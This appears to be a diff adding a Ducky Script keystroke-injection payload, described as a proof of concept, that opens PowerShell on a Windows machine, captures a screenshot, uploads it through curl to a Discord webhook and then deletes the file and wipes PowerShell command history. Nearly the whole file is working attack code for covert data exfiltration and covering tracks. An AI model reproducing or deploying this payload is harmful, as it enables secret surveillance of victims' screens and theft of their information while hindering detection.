@@ -1,0 +1,12 @@
+REM By Joshua O' Brien
+REM POC of sending screenshot via discord webhook
+REM Webhook SCv1
+DEFAULT_DELAY 500
+GUI r
+STRING powershell
+ENTER
+REM save photo to temp folder
+STRING $hookurl = "";$Filett = "$env:temp\SC.png";Add-Type -AssemblyName System.Windows.Forms;Add-type -AssemblyName System.Drawing;$Screen1 = Get-CimInstance Win32_VideoController;$Screen2 = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = [int]($Screen1).CurrentHorizontalResolution;$Height = [int]($Screen1).CurrentVerticalResolution;$Left = $Screen2.Left;$Top = $Screen2.Top;$bitmap = New-Object System.Drawing.Bitmap $Width, $Height;$graphic = [System.Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size);$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png);curl.exe  -s -o nul -F "file1=@$Filett" $hookurl | Out-Null;
+ENTER
+REM clears history
+STRING Remove-Item $Filett -Force;[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();Remove-item (Get-PSReadlineOption).HistorySavePath;
